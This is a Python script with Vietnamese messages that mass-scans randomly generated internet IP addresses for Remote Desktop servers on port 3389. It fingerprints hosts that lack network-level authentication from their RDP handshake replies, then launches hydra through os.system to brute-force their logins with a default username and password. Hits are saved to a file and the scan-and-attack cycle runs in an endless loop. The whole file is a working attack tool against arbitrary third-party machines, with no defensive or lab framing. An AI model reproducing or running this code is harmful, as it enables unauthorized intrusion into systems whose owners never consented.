import random
import socket
import threading
import os

class BruteForceVPS:
    def __init__(self, username="John", password="12345", targets_ip_path="targets.txt", hydra_output="hydra_output.txt"):
        print(f"Lời nhắc: các mục tiêu đã tấn công thành công được lưu vào tệp {hydra_output}")
        self.username = username
        self.password = password
        self.hydra_output = hydra_output
        self.targets_ip_path = targets_ip_path
        self.ip_log = []

    def random_ip(self):
        while True:
            g1 = str(random.choice([i for i in range(253)]))
            g2 = str(random.choice([i for i in range(253)]))
            g3 = str(random.choice([i for i in range(253)]))
            g4 = str(random.choice([i for i in range(253)]))
            return f"{g1}.{g2}.{g3}.{g4}"

    def check_rdp(self):
        try:
            ip = self.random_ip()
            session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            session.settimeout(1)
            check_result = session.connect_ex((ip, 3389))
            if check_result == 0 and ip not in self.ip_log:
                self.ip_log.append(ip)
                session.send(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
                response = session.recv(1024)
                filter_rdp_non_verify = [b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x1f\x08\x00\x02\x00\x00\x00",
                                        b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x0f\x08\x00\x02\x00\x00\x00"]
                if response in filter_rdp_non_verify:
                    print(f"đã tìm thấy mục tiêu {ip}")
                    with open(self.targets_ip_path, "a", encoding="utf-8") as file:
                        file.write(f"{ip}\n")
        except:
            pass

    def multi_thread_scan(self, thread_num):
        threads = []
        for _ in range(thread_num):
            thread = threading.Thread(target=self.check_rdp)
            thread.start()
            threads.append(thread)
        for t in threads:
            t.join()
    
    def hydra_attack(self, hydra_thread=1):
        os.system(f"hydra -t {hydra_thread} -l {self.username} -p {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
    

    def run(self, num_thread):
        while True:
            if os.path.exists(self.targets_ip_path) == True:
                os.remove(self.targets_ip_path)
            print("bắt đầu tìm kiếm mục tiêu")
            self.multi_thread_scan(thread_num=num_thread)
            print("bắt đầu tấn công")
            self.hydra_attack()

num_thread = int(input("nhập số luồng : "))
brute = BruteForceVPS()
brute.run(num_thread=num_thread)
